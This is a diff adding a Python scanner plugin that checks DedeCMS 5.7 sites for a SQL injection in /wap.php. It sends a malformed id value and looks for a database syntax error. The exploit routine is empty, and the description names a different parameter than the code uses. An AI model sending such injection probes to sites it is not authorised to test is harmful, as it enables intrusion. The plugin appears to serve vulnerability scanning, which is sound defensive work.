@@ -1,0 +1,54 @@
+# coding: utf-8
+
+from CScanPoc.thirdparty import requests
+from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+import urllib,urllib2
+import re
+
+class Vuln(ABVuln):
+    vuln_id = 'dedecms_0004_p_bb2' # 平台漏洞编号，留空
+    name = 'DedeCMS 5.7 /wap.php SQL注入漏洞' # 漏洞名称
+    level = VulnLevel.HIGH # 漏洞危害级别
+    type = VulnType.INJECTION # 漏洞类型
+    disclosure_date = '2014-03-20'  # 漏洞公布时间
+    desc = '''
+        DedeCMS 5.7 /wap.php 文件sids参数在当action为list时没有合适过滤，导致SQL注入漏洞。
+    ''' # 漏洞描述
+    ref = 'https://www.seebug.org/vuldb/ssvid-62607' # 漏洞来源
+    cnvd_id = '' # cnvd漏洞编号
+    cve_id = '' #cve编号
+    product = 'dedecms'  # 漏洞应用名称
+    product_version = '5.7'  # 漏洞应用版本
+
+
+class Poc(ABPoc):
+    poc_id = '3c5e7081-71d2-4436-af3d-41397c2a887a'
+    author = 'cscan'  # POC编写者
+    create_date = '2018-05-06' # POC创建时间
+
+    def __init__(self):
+        super(Poc, self).__init__(Vuln())
+
+    def verify(self):
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))      
+            
+            payload = "/wap.php?action=list&id=392%20test"
+            verify_url = '{target}'.format(target=self.target)+payload
+            req = urllib2.Request(verify_url)
+            content = urllib2.urlopen(req).read()
+            if "Error page: <font color='red'>/wap.php?action=list&id=392%20test</font>" in content:
+                if "Error infos: You have an error in your SQL syntax;" in content:
+                    if "typeid in(392 test)" in content:
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
+
+    def exploit(self):
+        super(Poc, self).exploit()
+        
+
+if __name__ == '__main__':
+    Poc().run()
